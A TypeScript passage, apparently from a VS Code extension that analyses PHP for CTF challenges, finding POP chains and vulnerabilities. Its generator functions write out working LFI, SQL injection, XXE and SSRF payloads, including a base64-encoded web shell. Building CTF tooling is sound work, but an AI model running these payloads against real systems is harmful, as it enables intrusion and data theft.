import * as vscode from 'vscode';
import * as path from 'path';
import { PHPAnalyzer } from './analyzers/phpAnalyzer';
import { VariableTracker } from './analyzers/variableTracker';
import { ClassAnalyzer } from './analyzers/classAnalyzer';
import { MagicMethodDetector } from './analyzers/magicMethodDetector';
import { SerializationAnalyzer } from './analyzers/serializationAnalyzer';
import { POPChainDetector, POPChainResult, ChainStep } from './analyzers/popChainDetector';
import { AttackChainAnalyzer } from './analyzers/attackChainAnalyzer';
import { VulnerabilityScanner } from './analyzers/vulnerabilityScanner';
import { MultiFileCoordinationAnalyzer } from './analyzers/multiFileCoordinationAnalyzer';
import { AnalysisResultsProvider } from './providers/analysisResultsProvider';
import { CodeGraphProvider } from './providers/codeGraphProvider';
import { PayloadGenerator } from './utils/payloadGenerator';
import { GraphServer } from './server/graphServer';
import { AnalysisResult } from './types';

let graphServer: GraphServer | null = null;

// Decoration type for highlighting
let highlightDecorationType: vscode.TextEditorDecorationType;

export function activate(context: vscode.ExtensionContext) {
    console.log('PHP Code Analyzer for CTF is now active');

    // Create highlight decoration type
    highlightDecorationType = vscode.window.createTextEditorDecorationType({
        backgroundColor: 'rgba(255, 255, 0, 0.3)',
        border: '2px solid #ff6b6b',
        borderRadius: '3px',
        isWholeLine: true
    });

    // Initialize providers
    const analysisResultsProvider = new AnalysisResultsProvider();
    const codeGraphProvider = new CodeGraphProvider(context.extensionUri);

    // Register tree view
    vscode.window.registerTreeDataProvider('phpAnalysisResults', analysisResultsProvider);

    // Register commands
    context.subscriptions.push(
        vscode.commands.registerCommand('phpAnalyzer.analyzeClassRelations', async () => {
            await analyzeClassRelations(analysisResultsProvider);
        })
    );

    context.subscriptions.push(
        vscode.commands.registerCommand('phpAnalyzer.findPOPChain', async () => {
            await findPOPChain(analysisResultsProvider);
        })
    );

    context.subscriptions.push(
        vscode.commands.registerCommand('phpAnalyzer.fullSecurityAnalysis', async () => {
            await fullSecurityAnalysis(analysisResultsProvider, codeGraphProvider);
        })
    );

    context.subscriptions.push(
        vscode.commands.registerCommand('phpAnalyzer.scanVulnerabilities', async () => {
            await scanVulnerabilities(analysisResultsProvider);
        })
    );

    context.subscriptions.push(
        vscode.commands.registerCommand('phpAnalyzer.generateExploitPayload', async () => {
            await generateExploitPayload();
        })
    );

    context.subscriptions.push(
        vscode.commands.registerCommand('phpAnalyzer.showCodeGraph', async () => {
            await showCodeGraph(codeGraphProvider);
        })
    );

    context.subscriptions.push(
        vscode.commands.registerCommand('phpAnalyzer.analyzeMultipleFiles', async () => {
            await analyzeMultipleFiles(analysisResultsProvider, codeGraphProvider);
        })
    );

    // Start the graph server (after commands are registered so activation never fails silently)
    try {
        const config = vscode.workspace.getConfiguration('phpAnalyzer');
        const port = config.get<number>('graphServerPort') || 3000;
        graphServer = new GraphServer(port);

        // Register highlight callback - this gets called when user clicks nodes in web UI
        graphServer.setHighlightCallback((filePath: string, line: number, column?: number) => {
            highlightInEditor(filePath, line, column || 0);
        });

        graphServer.start().then((success) => {
            if (success) {
                console.log(`Graph visualization server started on port ${port}`);
            } else {
                vscode.window.showWarningMessage(`Failed to start graph server on port ${port}. Graph visualization will not be available.`);
            }
        });
    } catch (error: any) {
        console.error('Failed to initialize graph server:', error);
        vscode.window.showWarningMessage(`Graph server failed to start: ${error?.message || error}`);
    }

    // Auto-analyze on open if enabled
    vscode.workspace.onDidOpenTextDocument((document) => {
        if (document.languageId === 'php') {
            const config = vscode.workspace.getConfiguration('phpAnalyzer');
            if (config.get('autoAnalyzeOnOpen')) {
                scanVulnerabilities(analysisResultsProvider);
            }
        }
    });
}

async function getActivePhpDocument(): Promise<{ document: vscode.TextDocument; text: string } | null> {
    const editor = vscode.window.activeTextEditor;
    if (!editor || editor.document.languageId !== 'php') {
        vscode.window.showErrorMessage('Please open a PHP file first');
        return null;
    }
    return {
        document: editor.document,
        text: editor.document.getText()
    };
}

async function trackVariableFlow(provider: AnalysisResultsProvider) {
    const docInfo = await getActivePhpDocument();
    if (!docInfo) {return;}

    const editor = vscode.window.activeTextEditor!;
    const selection = editor.selection;
    const variableName = editor.document.getText(selection);

    if (!variableName || !variableName.startsWith('$')) {
        vscode.window.showErrorMessage('Please select a variable name (e.g., $var)');
        return;
    }

    try {
        const analyzer = new PHPAnalyzer(docInfo.text);
        const tracker = new VariableTracker(analyzer.getAST());
        const results = tracker.trackVariable(variableName, docInfo.document);
        
        provider.updateResults('Variable Flow', results);
        vscode.window.showInformationMessage(`Tracked ${results.length} references to ${variableName}`);
    } catch (error: any) {
        vscode.window.showErrorMessage(`Error tracking variable: ${error.message}`);
    }
}

async function analyzeClassRelations(provider: AnalysisResultsProvider) {
    const docInfo = await getActivePhpDocument();
    if (!docInfo) {return;}

    const editor = vscode.window.activeTextEditor!;
    const selection = editor.selection;
    const className = editor.document.getText(selection);

    if (!className) {
        vscode.window.showErrorMessage('Please select a class name');
        return;
    }

    try {
        const analyzer = new PHPAnalyzer(docInfo.text);
        const classAnalyzer = new ClassAnalyzer(analyzer.getAST());
        const results = classAnalyzer.analyzeClass(className, docInfo.document);
        
        provider.updateResults('Class Relations', results);
        vscode.window.showInformationMessage(`Analyzed class: ${className}`);
    } catch (error: any) {
        vscode.window.showErrorMessage(`Error analyzing class: ${error.message}`);
    }
}

async function showMagicMethods(provider: AnalysisResultsProvider) {
    const docInfo = await getActivePhpDocument();
    if (!docInfo) {return;}

    try {
        const analyzer = new PHPAnalyzer(docInfo.text);
        const detector = new MagicMethodDetector(analyzer.getAST());
        const results = detector.findMagicMethods(docInfo.document);
        
        provider.updateResults('Magic Methods', results);
        vscode.window.showInformationMessage(`Found ${results.length} magic methods`);
    } catch (error: any) {
        vscode.window.showErrorMessage(`Error finding magic methods: ${error.message}`);
    }
}

async function findSerializationPoints(provider: AnalysisResultsProvider) {
    const docInfo = await getActivePhpDocument();
    if (!docInfo) {return;}

    try {
        const analyzer = new PHPAnalyzer(docInfo.text);
        const serializer = new SerializationAnalyzer(analyzer.getAST());
        const results = serializer.findSerializationPoints(docInfo.document);
        
        provider.updateResults('Serialization Points', results);
        vscode.window.showInformationMessage(`Found ${results.length} serialization points`);
    } catch (error: any) {
        vscode.window.showErrorMessage(`Error finding serialization points: ${error.message}`);
    }
}

async function findPOPChain(provider: AnalysisResultsProvider) {
    const docInfo = await getActivePhpDocument();
    if (!docInfo) {return;}

    try {
        const config = vscode.workspace.getConfiguration('phpAnalyzer');
        const maxDepth = config.get<number>('maxChainDepth') || 10;

        const detector = new POPChainDetector();
        const results = detector.findPOPChains(docInfo.text);
        
        // Use results directly for graph visualization
        const detailedChains = results;
        
        // Update graph server with POP chain data
        if (graphServer) {
            graphServer.setCurrentFilePath(docInfo.document.uri.fsPath);
            graphServer.updateGraphData('popchains', {
                chains: detailedChains,
                nodes: buildPOPChainNodes(detailedChains),
                edges: buildPOPChainEdges(detailedChains)
            });
            
            // Also build attack chain graph
            const attackChainGraph = buildAttackChainFromPOP(detailedChains, docInfo.document);
            graphServer.updateGraphData('attackchain', attackChainGraph);
        }
        
        // Convert to AnalysisResult format
        const analysisResults: AnalysisResult[] = results.map(chain => ({
            type: 'pop-chain',
            severity: (chain.riskLevel === 'critical' ? 'critical' : 'error') as 'critical' | 'error',
            message: `POP Chain: ${chain.entryClass}::${chain.entryMethod} → ${chain.finalSink}`,
            location: new vscode.Location(
                docInfo.document.uri,
                new vscode.Position(Math.max(0, (chain.steps[0]?.line || 1) - 1), 0)
            ),
            details: chain.description
        }));
        
        provider.updateResults('POP Chains', analysisResults);
        
        // Show payload if chains found
        if (detailedChains.length > 0) {
            const showPayload = await vscode.window.showInformationMessage(
                `Found ${detailedChains.length} POP chains! View exploit payload?`,
                'Show Payload', 'Open Graph'
            );
            
            if (showPayload === 'Show Payload') {
                // Show payload in new document
                const payload = detailedChains[0].payload;
                const doc = await vscode.workspace.openTextDocument({
                    content: payload,
                    language: 'php'
                });
                await vscode.window.showTextDocument(doc);
            } else if (showPayload === 'Open Graph') {
                if (graphServer) {
                    const port = graphServer.getPort();
                    await vscode.env.openExternal(vscode.Uri.parse(`http://localhost:${port}`));
                }
            }
        } else {
            vscode.window.showInformationMessage('No exploitable POP chains found');
        }
    } catch (error: any) {
        vscode.window.showErrorMessage(`Error finding POP chains: ${error.message}`);
    }
}

// Helper function to build POP chain graph nodes
function buildPOPChainNodes(chains: POPChainResult[]): any[] {
    const nodes: any[] = [];
    const addedNodes = new Set<string>();
    
    for (let chainIdx = 0; chainIdx < chains.length; chainIdx++) {
        const chain = chains[chainIdx];
        
        // 入口点就是第一个step，不需要单独创建entry节点
        // 直接从steps开始构建节点
        
        // Add step nodes
        for (let i = 0; i < chain.steps.length; i++) {
            const step = chain.steps[i];
            const nodeId = `chain_${chainIdx}_step_${i}`;
            
            if (!addedNodes.has(nodeId)) {
                const isEntry = i === 0;
                const isSink = i === chain.steps.length - 1 && step.calls && step.calls.length > 0;
                
                nodes.push({
                    id: nodeId,
                    label: isEntry ? `🎯 ${step.className}::${step.methodName}` : `${step.className}::${step.methodName}`,
                    type: isEntry ? 'entry' : (isSink ? 'sink' : (step.methodName.startsWith('__') ? 'magic' : 'method')),
                    metadata: {
                        line: step.line,
                        trigger: step.trigger,
                        description: step.description,
                        dangerous: isSink,
                        reads: step.reads,
                        writes: step.writes,
                        calls: step.calls,
                        operations: step.operations,
                        propertyName: step.propertyName,
                        propertyValue: step.propertyValue,
                        riskLevel: chain.riskLevel
                    }
                });
                addedNodes.add(nodeId);
            }
        }
        
        // Add final sink node (dangerous call)
        if (chain.finalSink) {
            const sinkId = `chain_${chainIdx}_sink`;
            if (!addedNodes.has(sinkId)) {
                nodes.push({
                    id: sinkId,
                    label: `💀 ${chain.finalSink}`,
                    type: 'sink',
                    metadata: {
                        dangerous: true,
                        exploitMethod: chain.exploitMethod
                    }
                });
                addedNodes.add(sinkId);
            }
        }
    }
    
    return nodes;
}

// Helper function to build POP chain graph edges
function buildPOPChainEdges(chains: POPChainResult[]): any[] {
    const edges: any[] = [];
    
    for (let chainIdx = 0; chainIdx < chains.length; chainIdx++) {
        const chain = chains[chainIdx];
        
        // Connect steps in sequence
        for (let i = 0; i < chain.steps.length; i++) {
            const step = chain.steps[i];
            const stepId = `chain_${chainIdx}_step_${i}`;
            
            if (i > 0) {
                // Connect previous step to current
                const prevStepId = `chain_${chainIdx}_step_${i - 1}`;
                edges.push({
                    source: prevStepId,
                    target: stepId,
                    type: 'triggers',
                    label: step.trigger || '→'
                });
            }
        }
        
        // Connect last step to sink
        if (chain.steps.length > 0 && chain.finalSink) {
            const lastStepId = `chain_${chainIdx}_step_${chain.steps.length - 1}`;
            const sinkId = `chain_${chainIdx}_sink`;
            edges.push({
                source: lastStepId,
                target: sinkId,
                type: 'exploit',
                label: '利用'
            });
        }
    }
    
    return edges;
}

// Build attack chain graph from POP chains
function buildAttackChainFromPOP(chains: POPChainResult[], document: vscode.TextDocument): any {
    const nodes: any[] = [];
    const edges: any[] = [];
    
    for (let chainIdx = 0; chainIdx < chains.length; chainIdx++) {
        const chain = chains[chainIdx];
        
        // Entry node
        const entryId = `attack_${chainIdx}_entry`;
        nodes.push({
            id: entryId,
            label: `🎯 ${chain.entryClass}::${chain.entryMethod}`,
            type: 'entry',
            metadata: {
                line: chain.steps[0]?.line || 1,
                riskLevel: chain.riskLevel,
                description: chain.description
            }
        });
        
        let prevNodeId = entryId;
        
        for (let i = 0; i < chain.steps.length; i++) {
            const step = chain.steps[i];
            const nodeId = `attack_${chainIdx}_step_${i}`;
            
            nodes.push({
                id: nodeId,
                label: `${step.className}::${step.methodName}`,
                type: i === chain.steps.length - 1 ? 'sink' : 'magic',
                metadata: {
                    line: step.line,
                    trigger: step.trigger,
                    description: step.description
                }
            });
            
            edges.push({
                source: prevNodeId,
                target: nodeId,
                type: 'triggers',
                label: step.trigger || '→'
            });
            
            prevNodeId = nodeId;
        }
        
        // Final sink node
        if (chain.finalSink) {
            const sinkId = `attack_${chainIdx}_sink`;
            nodes.push({
                id: sinkId,
                label: `💀 ${chain.finalSink}`,
                type: 'sink',
                metadata: {
                    dangerous: true,
                    riskLevel: chain.riskLevel,
                    exploitMethod: chain.exploitMethod
                }
            });
            
            edges.push({
                source: prevNodeId,
                target: sinkId,
                type: 'exploit',
                label: '执行'
            });
        }
    }
    
    return { nodes, edges };
}

async function analyzeMultipleFiles(provider: AnalysisResultsProvider, graphProvider: CodeGraphProvider) {
    try {
        // 让用户选择要分析的文件夹
        const folderUri = await vscode.window.showOpenDialog({
            canSelectFolders: true,
            canSelectFiles: false,
            canSelectMany: false,
            title: '选择要分析的 PHP 项目文件夹'
        });

        if (!folderUri || folderUri.length === 0) {
            return;
        }

        const folderPath = folderUri[0].fsPath;

        // 显示进度提示
        await vscode.window.withProgress({
            location: vscode.ProgressLocation.Notification,
            title: '正在分析多个 PHP 文件...',
            cancellable: false
        }, async (progress) => {
            try {
                // 创建分析器实例
                const analyzer = new MultiFileCoordinationAnalyzer(folderPath);

                // 执行分析
                const result = await analyzer.analyzeFolder(folderPath, (current: number, total: number, message: string) => {
                    const percentage = Math.round((current / total) * 100);
                    progress.report({
                        increment: (100 / total),
                        message: `${message} (${current}/${total})`
                    });
                });

                // 清空之前的结果
                provider.clearResults();

                // 转换结果为树形结构
                const treeItems: any[] = [];

                // 文件统计
                treeItems.push({
                    label: `📊 分析统计`,
                    description: `${result.fileCount} 个文件，${result.relationCount} 个关系`,
                    collapsibleState: vscode.TreeItemCollapsibleState.Expanded,
                    children: [
                        { label: `文件总数: ${result.fileCount}`, collapsibleState: vscode.TreeItemCollapsibleState.None },
                        { label: `协同关系: ${result.relationCount}`, collapsibleState: vscode.TreeItemCollapsibleState.None },
                        { label: `分析耗时: ${result.analysisTime}ms`, collapsibleState: vscode.TreeItemCollapsibleState.None },
                        { label: `全局漏洞: ${result.globalVulnerabilities.length}`, collapsibleState: vscode.TreeItemCollapsibleState.None },
                        { label: `跨文件 POP 链: ${result.popChains.length}`, collapsibleState: vscode.TreeItemCollapsibleState.None }
                    ]
                });

                // 文件关系
                if (result.relations.length > 0) {
                    const relationItems = result.relations.map((rel: any) => ({
                        label: `${getFileName(rel.source)} → ${getFileName(rel.target)}`,
                        description: `[${rel.type}]${rel.severity ? ` 风险: ${rel.severity}` : ''}`,
                        collapsibleState: rel.items.length > 0 ? vscode.TreeItemCollapsibleState.Collapsed : vscode.TreeItemCollapsibleState.None,
                        children: rel.items.map((item: any) => ({
                            label: `${item.sourceIdentifier} ${item.operation} ${item.targetIdentifier}`,
                            description: `[${item.itemType}]${item.riskLevel ? ` 风险: ${item.riskLevel}` : ''}`,
                            collapsibleState: vscode.TreeItemCollapsibleState.None
                        }))
                    }));

                    treeItems.push({
                        label: `🔗 文件协同关系 (${relationItems.length})`,
                        collapsibleState: vscode.TreeItemCollapsibleState.Expanded,
                        children: relationItems
                    });
                }

                // 全局漏洞
                if (result.globalVulnerabilities.length > 0) {
                    const vulnItems = result.globalVulnerabilities.map((vuln: any) => ({
                        label: vuln.name,
                        description: `[${vuln.severity}] ${vuln.id}`,
                        collapsibleState: vscode.TreeItemCollapsibleState.None
                    }));

                    treeItems.push({
                        label: `⚠️ 全局漏洞 (${vulnItems.length})`,
                        collapsibleState: vscode.TreeItemCollapsibleState.Expanded,
                        children: vulnItems
                    });
                }

                // 跨文件 POP 链
                if (result.popChains.length > 0) {
                    const popItems = result.popChains.map((chain: any, idx: number) => ({
                        label: `${chain.entryPoint} → ${chain.sink}`,
                        description: `风险等级: ${Math.round(chain.exploitability * 100)}%`,
                        collapsibleState: chain.steps.length > 0 ? vscode.TreeItemCollapsibleState.Collapsed : vscode.TreeItemCollapsibleState.None,
                        children: chain.steps.map((step: any) => ({
                            label: `${step.className}::${step.methodName}`,
                            description: step.operation,
                            collapsibleState: vscode.TreeItemCollapsibleState.None
                        }))
                    }));

                    treeItems.push({
                        label: `🔓 跨文件 POP 链 (${popItems.length})`,
                        collapsibleState: vscode.TreeItemCollapsibleState.Expanded,
                        children: popItems
                    });
                }

                // 更新提供者结果
                provider.updateResults('多文件分析', treeItems);

                // 完成提示
                const action = await vscode.window.showInformationMessage(
                    `✅ 分析完成！找到 ${result.relations.length} 个协同关系`,
                    '关闭'
                );
            } catch (error: any) {
                vscode.window.showErrorMessage(`多文件分析失败: ${error.message}`);
                console.error('Multi-file analysis error:', error);
            }
        });
    } catch (error: any) {
        vscode.window.showErrorMessage(`打开文件夹失败: ${error.message}`);
    }
}

function getFileName(filePath: string): string {
    return path.basename(filePath);
}

async function fullSecurityAnalysis(provider: AnalysisResultsProvider, graphProvider: CodeGraphProvider) {
    const docInfo = await getActivePhpDocument();
    if (!docInfo) {return;}

    const progress = await vscode.window.withProgress({
        location: vscode.ProgressLocation.Notification,
        title: 'Running Full Security Analysis',
        cancellable: false
    }, async (progress) => {
        try {
            progress.report({ increment: 0, message: 'Parsing code...' });
            const analyzer = new PHPAnalyzer(docInfo.text);
            const ast = analyzer.getAST();

            progress.report({ increment: 20, message: 'Finding serialization points...' });
            const serializer = new SerializationAnalyzer(ast);
            const serializationResults = serializer.findSerializationPoints(docInfo.document);

            progress.report({ increment: 40, message: 'Detecting POP chains...' });
            const config = vscode.workspace.getConfiguration('phpAnalyzer');
            const maxDepth = config.get<number>('maxChainDepth') || 5;
            const popDetector = new POPChainDetector();
            const popChainResults = popDetector.findPOPChains(docInfo.text);
            
            // Convert POPChainResult to AnalysisResult format
            const popResults: AnalysisResult[] = popChainResults.map(chain => ({
                type: 'pop-chain',
                severity: (chain.riskLevel === 'critical' ? 'critical' : 'error') as 'critical' | 'error',
                message: `POP Chain: ${chain.entryClass}::${chain.entryMethod} → ${chain.finalSink}`,
                location: new vscode.Location(
                    docInfo.document.uri,
                    new vscode.Position(Math.max(0, (chain.steps[0]?.line || 1) - 1), 0)
                ),
                details: chain.description
            }));

            progress.report({ increment: 60, message: 'Analyzing attack chains...' });
            const attackAnalyzer = new AttackChainAnalyzer(ast, maxDepth);
            const attackResults = attackAnalyzer.analyzeAttackChains(docInfo.document);

            progress.report({ increment: 80, message: 'Scanning vulnerabilities...' });
            const vulnScanner = new VulnerabilityScanner(ast);
            const vulnResults = vulnScanner.scanVulnerabilities(docInfo.document);

            progress.report({ increment: 90, message: 'Generating report...' });
            
            const allResults = [
                ...serializationResults,
                ...popResults,
                ...attackResults,
                ...vulnResults
            ];

            provider.updateResults('Full Analysis', allResults);

            if (config.get('showGraphOnAnalysis')) {
                progress.report({ increment: 95, message: 'Generating code graph...' });
                
                if (graphServer && graphServer.isRunning()) {
                    const graph = graphProvider.buildCodeGraph(ast, docInfo.document);
                    graphServer.updateGraphData('code', graph);
                    
                    const port = graphServer.getPort();
                    const url = `http://localhost:${port}`;
                    await vscode.env.openExternal(vscode.Uri.parse(url));
                } else {
                    await graphProvider.showCodeGraph(ast, docInfo.document);
                }
            }

            progress.report({ increment: 100 });
            
            return allResults.length;
        } catch (error: any) {
            vscode.window.showErrorMessage(`Error during analysis: ${error.message}`);
            return 0;
        }
    });

    vscode.window.showInformationMessage(`Analysis complete! Found ${progress} items`);
}

async function analyzeAttackChains(provider: AnalysisResultsProvider, graphProvider: CodeGraphProvider) {
    const docInfo = await getActivePhpDocument();
    if (!docInfo) {return;}

    try {
        const config = vscode.workspace.getConfiguration('phpAnalyzer');
        const maxDepth = config.get<number>('maxChainDepth') || 5;

        const analyzer = new PHPAnalyzer(docInfo.text);
        const attackAnalyzer = new AttackChainAnalyzer(analyzer.getAST(), maxDepth);
        const results = attackAnalyzer.analyzeAttackChains(docInfo.document);
        
        provider.updateResults('Attack Chains', results);
        
        // Update graph server with attack chain graph
        if (graphServer && graphServer.isRunning()) {
            const graph = graphProvider.buildAttackChainGraph(results);
            graphServer.updateGraphData('attackchain', graph);
            
            const port = graphServer.getPort();
            const url = `http://localhost:${port}`;
            await vscode.env.openExternal(vscode.Uri.parse(url));
        } else {
            // Fallback to webview
            await graphProvider.highlightAttackPaths(results);
        }
        
        vscode.window.showInformationMessage(`Found ${results.length} attack chains`);
    } catch (error: any) {
        vscode.window.showErrorMessage(`Error analyzing attack chains: ${error.message}`);
    }
}

async function scanVulnerabilities(provider: AnalysisResultsProvider) {
    const docInfo = await getActivePhpDocument();
    if (!docInfo) {return;}

    try {
        const analyzer = new PHPAnalyzer(docInfo.text);
        const scanner = new VulnerabilityScanner(analyzer.getAST());
        const results = scanner.scanVulnerabilities(docInfo.document);
        
        provider.updateResults('Vulnerabilities', results);
        vscode.window.showInformationMessage(`Found ${results.length} potential vulnerabilities`);
    } catch (error: any) {
        vscode.window.showErrorMessage(`Error scanning vulnerabilities: ${error.message}`);
    }
}

async function generateExploitPayload() {
    const docInfo = await getActivePhpDocument();
    if (!docInfo) {return;}

    await vscode.window.withProgress({
        location: vscode.ProgressLocation.Notification,
        title: 'Analyzing code and generating payload...',
        cancellable: false
    }, async (progress) => {
        try {
            progress.report({ increment: 0, message: 'Parsing PHP code...' });
            const analyzer = new PHPAnalyzer(docInfo.text);
            const config = vscode.workspace.getConfiguration('phpAnalyzer');
            const maxDepth = config.get<number>('maxChainDepth') || 5;
            
            progress.report({ increment: 30, message: 'Detecting POP chains...' });
            // 首先尝试用 POPChainDetector 找 POP 链
            const popDetector = new POPChainDetector();
            const popChains = popDetector.findPOPChains(docInfo.text);
            
            if (popChains.length > 0) {
                progress.report({ increment: 100, message: 'Found POP chains!' });
                const items = popChains.map((chain, index) => ({
                    label: `🔗 ${chain.entryClass}::${chain.entryMethod} → ${chain.finalSink}`,
                    description: `${chain.riskLevel} - ${chain.vulnType || 'pop_chain'}`,
                    detail: chain.description,
                    chain: chain,
                    index: index
                }));

                const selected = await vscode.window.showQuickPick(items, {
                    placeHolder: 'Select a POP chain to generate exploit payload'
                });

                if (selected && selected.chain.payload) {
                    const doc = await vscode.workspace.openTextDocument({
                        content: selected.chain.payload,
                        language: 'php'
                    });
                    await vscode.window.showTextDocument(doc);
                    vscode.window.showInformationMessage('POP chain payload generated!');
                }
                return;
            }

            progress.report({ increment: 50, message: 'Analyzing attack chains...' });
            // 尝试 AttackChainAnalyzer
            const attackAnalyzer = new AttackChainAnalyzer(analyzer.getAST(), maxDepth);
            const chains = attackAnalyzer.analyzeAttackChains(docInfo.document);

            if (chains.length > 0) {
                progress.report({ increment: 100, message: 'Found attack chains!' });
                const generator = new PayloadGenerator();
                const payload = await generator.generatePayload(chains, docInfo.document);
                
                if (payload) {
                    const doc = await vscode.workspace.openTextDocument({
                        content: payload,
                        language: 'php'
                    });
                    await vscode.window.showTextDocument(doc);
                }
                return;
            }

            progress.report({ increment: 70, message: 'Scanning vulnerabilities...' });
            // 用 VulnerabilityScanner 找漏洞并生成解题 payload
            const vulnScanner = new VulnerabilityScanner(analyzer.getAST());
            const vulnResults = vulnScanner.scanVulnerabilities(docInfo.document);
            
            const vulns = vulnResults.map(r => ({
                id: (r.type.match(/\[([A-Z]+-\d+)\]/) || ['', r.type])[1] || r.type,
                name: r.message,
                description: r.details || '',
                line: r.location?.range?.start?.line || 0
            }));
            
            if (vulns.length === 0) {
                vscode.window.showWarningMessage('No vulnerabilities found in the code.');
                return;
            }

            progress.report({ increment: 100, message: 'Generating payload...' });
            const payload = generateVulnerabilityPayload(vulns, docInfo.text);
            if (payload) {
                const doc = await vscode.workspace.openTextDocument({
                    content: payload,
                    language: 'php'
                });
                await vscode.window.showTextDocument(doc);
                vscode.window.showInformationMessage(`Generated exploit for ${vulns.length} vulnerability(ies)!`);
            }
        } catch (error: any) {
            vscode.window.showErrorMessage(`Error generating payload: ${error.message}`);
        }
    });
}

// 根据漏洞类型生成解题 payload
function generateVulnerabilityPayload(vulns: any[], sourceCode: string): string {
    let payload = `<?php\n/**\n * CTF Challenge Solution\n * Generated by PHP Code Analyzer for CTF\n */\n\n`;
    
    for (const vuln of vulns) {
        payload += `// ═══════════════════════════════════════════════════════════\n`;
        payload += `// 漏洞: ${vuln.name}\n`;
        payload += `// ID: ${vuln.id}\n`;
        payload += `// 行号: ${vuln.line}\n`;
        payload += `// ═══════════════════════════════════════════════════════════\n\n`;
        
        switch (vuln.id) {
            case 'WEAK-001':
                payload += generateIntvalBypassPayload(vuln, sourceCode);
                break;
            case 'LFI-001':
                payload += generateLFIPayload(vuln);
                break;
            case 'SQL-001':
                payload += generateSQLiPayload(vuln);
                break;
            case 'XXE-001':
                payload += generateXXEPayload(vuln);
                break;
            case 'SSRF-001':
                payload += generateSSRFPayload(vuln);
                break;
            case 'PHAR-001':
                payload += generatePharPayload(vuln);
                break;
            case 'VAR-001':
                payload += generateExtractPayload(vuln);
                break;
            default:
                payload += `// TODO: 分析漏洞 ${vuln.id} 并构造 payload\n`;
                payload += `// 描述: ${vuln.description}\n\n`;
        }
    }
    
    return payload;
}

function generateIntvalBypassPayload(vuln: any, sourceCode: string): string {
    let payload = `/*\n`;
    payload += ` * intval() 绕过技巧\n`;
    payload += ` * \n`;
    payload += ` * intval($x) - 默认十进制解析\n`;
    payload += ` * intval($x, 0) - 自动检测进制 (0x=十六进制, 0=八进制, 其他=十进制)\n`;
    payload += ` */\n\n`;
    
    // 尝试从源码中提取目标值
    const match = sourceCode.match(/intval\s*\(\s*\$\w+\s*,\s*0\s*\)\s*[=!]=\s*(\d+)/);
    const targetValue = match ? parseInt(match[1]) : 47;
    
    payload += `// 目标值: ${targetValue}\n`;
    payload += `// 八进制表示: 0${targetValue.toString(8)}\n`;
    payload += `// 十六进制表示: 0x${targetValue.toString(16)}\n\n`;
    
    payload += `// 绕过方法 1: 使用八进制\n`;
    payload += `$payload1 = "0${targetValue.toString(8)}";  // 八进制 = ${targetValue}\n`;
    payload += `echo "intval('$payload1') = " . intval($payload1) . "\\n";        // 结果: 0 (十进制解析前导0)\n`;
    payload += `echo "intval('$payload1', 0) = " . intval($payload1, 0) . "\\n";  // 结果: ${targetValue} (八进制解析)\n\n`;
    
    payload += `// 绕过方法 2: 使用十六进制\n`;
    payload += `$payload2 = "0x${targetValue.toString(16)}";  // 十六进制 = ${targetValue}\n`;
    payload += `echo "intval('$payload2') = " . intval($payload2) . "\\n";        // 结果: 0\n`;
    payload += `echo "intval('$payload2', 0) = " . intval($payload2, 0) . "\\n";  // 结果: ${targetValue}\n\n`;
    
    payload += `// ==================== 解题 Payload ====================\n`;
    payload += `// POST 参数: newstar2025=0${targetValue.toString(8)}\n`;
    payload += `// 或: newstar2025=0x${targetValue.toString(16)}\n`;
    payload += `\n`;
    payload += `// curl 命令:\n`;
    payload += `// curl -X POST -d "newstar2025=0${targetValue.toString(8)}" http://target/challenge.php\n\n`;
    
    return payload;
}

function generateLFIPayload(vuln: any): string {
    let payload = `/*\n`;
    payload += ` * 本地文件包含 (LFI) 利用\n`;
    payload += ` */\n\n`;
    
    payload += `// 读取 /etc/passwd\n`;
    payload += `$lfi1 = "../../../etc/passwd";\n\n`;
    
    payload += `// 读取 flag (常见位置)\n`;
    payload += `$lfi2 = "../../../flag";\n`;
    payload += `$lfi3 = "../../../flag.php";\n`;
    payload += `$lfi4 = "../../../flag.txt";\n\n`;
    
    payload += `// 使用 PHP 伪协议读取源码\n`;
    payload += `$lfi5 = "php://filter/read=convert.base64-encode/resource=index.php";\n\n`;
    
    payload += `// 使用 data 伪协议执行代码\n`;
    payload += `$lfi6 = "data://text/plain,<?php phpinfo();?>";\n`;
    payload += `$lfi7 = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=";\n\n`;
    
    return payload;
}

function generateSQLiPayload(vuln: any): string {
    let payload = `/*\n`;
    payload += ` * SQL 注入利用\n`;
    payload += ` */\n\n`;
    
    payload += `// 基础注入测试\n`;
    payload += `$sqli1 = "' OR '1'='1";\n`;
    payload += `$sqli2 = "' OR 1=1--";\n`;
    payload += `$sqli3 = "' UNION SELECT 1,2,3--";\n\n`;
    
    payload += `// 读取数据库信息\n`;
    payload += `$sqli4 = "' UNION SELECT database(),user(),version()--";\n\n`;
    
    payload += `// 读取表名\n`;
    payload += `$sqli5 = "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--";\n\n`;
    
    return payload;
}

function generateXXEPayload(vuln: any): string {
    let payload = `/*\n`;
    payload += ` * XXE (XML 外部实体) 利用\n`;
    payload += ` */\n\n`;
    
    payload += `$xxe_payload = <<<XML\n`;
    payload += `<?xml version="1.0" encoding="UTF-8"?>\n`;
    payload += `<!DOCTYPE foo [\n`;
    payload += `  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n`;
    payload += `]>\n`;
    payload += `<root>&xxe;</root>\n`;
    payload += `XML;\n\n`;
    
    payload += `// 读取 flag\n`;
    payload += `$xxe_flag = <<<XML\n`;
    payload += `<?xml version="1.0"?>\n`;
    payload += `<!DOCTYPE foo [\n`;
    payload += `  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">\n`;
    payload += `]>\n`;
    payload += `<root>&xxe;</root>\n`;
    payload += `XML;\n\n`;
    
    return payload;
}

function generateSSRFPayload(vuln: any): string {
    let payload = `/*\n`;
    payload += ` * SSRF (服务端请求伪造) 利用\n`;
    payload += ` */\n\n`;
    
    payload += `// 绕过 localhost 过滤\n`;
    payload += `$ssrf1 = "http://127.0.0.1/";      // 可能被过滤\n`;
    payload += `$ssrf2 = "http://127.1/";          // 短格式\n`;
    payload += `$ssrf3 = "http://0.0.0.0/";        // 所有接口\n`;
    payload += `$ssrf4 = "http://[::1]/";          // IPv6 本地\n`;
    payload += `$ssrf5 = "http://0/";              // 十进制 0\n`;
    payload += `$ssrf6 = "http://2130706433/";    // 127.0.0.1 的十进制\n\n`;
    
    payload += `// 读取本地文件\n`;
    payload += `$ssrf7 = "file:///etc/passwd";\n`;
